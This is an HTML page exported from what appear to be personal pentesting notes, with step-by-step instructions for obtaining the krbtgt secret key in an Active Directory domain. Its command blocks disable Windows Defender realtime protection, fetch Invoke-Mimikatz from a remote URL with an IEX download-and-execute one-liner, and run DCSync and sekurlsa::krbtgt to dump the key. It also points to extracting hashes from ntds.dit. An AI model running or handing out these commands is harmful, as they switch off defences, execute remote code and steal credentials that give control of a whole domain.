<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Obtain Krbtgt secret key</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Obtain Krbtgt secret key</h1><br/><strong>0. Disable Windows Defender</strong><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Set-</span>MpPreference <span style="color:#ff9d00;font-weight:700">-</span>DisableRealtimeMonitoring <span style="color:#0088ff;font-weight:400">$true</span>     <span style="color:#0088ff;font-weight:400">#from Windows Server 2016</span></pre></div><br /><br /><strong>1. Obtain Krbtgt secret key(hash)</strong><br />   ◇ Perform DcSync from a Windows machine of the Domain<br />    The only pre-requisite to worry about is that you have an account with rights to perform domain replication. <br />    We can perform DCSync if we have “Replicating Directory Changes” permissions on the Windows Server:<br />        Server Manager → Tools → Active Directory Users and Computers → View → Advanced Features → Right click on the domain(e.g.:DANIELE.local) → proprieties  → security<br />    <a href=""><img src="images/1146-1.png" alt="images/1146-1.png" /></a><br />        <div class="codebox"><pre>PS&gt; IEX<span style="color:#ff9d00;font-weight:700">(</span>New-Object Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 &quot;</span><span style="color:#ff9d00;font-weight:700">);</span>Invoke-Mimikatz -Command <span style="color:#3ad900;font-weight:400">&#39;&quot;lsadump::dcsync /domain:daniele.local /user:krbtgt&quot;&#39;</span></pre></div><br />        <a href=""><img src="images/1146-2.png" alt="images/1146-2.png" /></a><br />   <br />   ◇ On the <span style="color:#ff8700;">Domain Controller</span> as Domain Admin to obtain <span style="color:#ff8700;">krbtgt</span> <span style="color:#ff0000;">secret key</span>(hash)<br />       <div class="codebox"><pre>PS&gt; IEX<span style="color:#ff9d00;font-weight:700">(</span>New-Object Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 &quot;</span><span style="color:#ff9d00;font-weight:700">);</span>Invoke-Mimikatz -Command <span style="color:#3ad900;font-weight:400">&#39;&quot;sekurlsa::krbtgt&quot;&#39;</span></pre></div><br />       <a href=""><img src="images/1146-3.png" alt="images/1146-3.png" /></a><br />   <br />   ◇ On the <span style="color:#ff8700;">Domain Controller</span> extract hashes from <strong>ntds.dit</strong> file <br />        We have seen it in the chapter “<a href="tion--Active_Directory(Windows)_Privilege_Escalation--Kerberos_Authentication_Attacks--dump_NTDS.dit_file_stored_on_the_Domain_Controller.html">Dump hashes from Windows machines</a>”<br /><br />Bibliography:<br />• <a href="https://stealthbits.com/blog/extracting-user-password-data-with-mimikatz-dcsync/">https://stealthbits.com/blog/extracting-user-password-data-with-mimikatz-dcsync/</a><br />• <a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a></div>
</body>
</html>
